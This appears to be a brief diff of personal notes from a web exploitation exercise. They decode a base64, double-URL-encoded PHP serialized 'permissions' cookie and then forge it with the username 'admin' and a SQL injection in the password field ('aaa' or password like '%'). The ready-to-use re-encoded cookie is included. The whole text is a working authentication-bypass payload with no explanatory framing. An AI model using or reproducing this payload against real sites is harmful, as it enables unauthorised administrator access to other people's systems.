@@ -1,0 +1,10 @@
+TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D
+
+urldecode(urldecode(base64decode($cookie)))
+
+O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}
+
+SQLI- O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:24:"aaa' or password like '%";}
+
+TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MjQ6ImFhYScgb3IgcGFzc3dvcmQgbGlrZSAnJSI7fQ%253D%253D
+
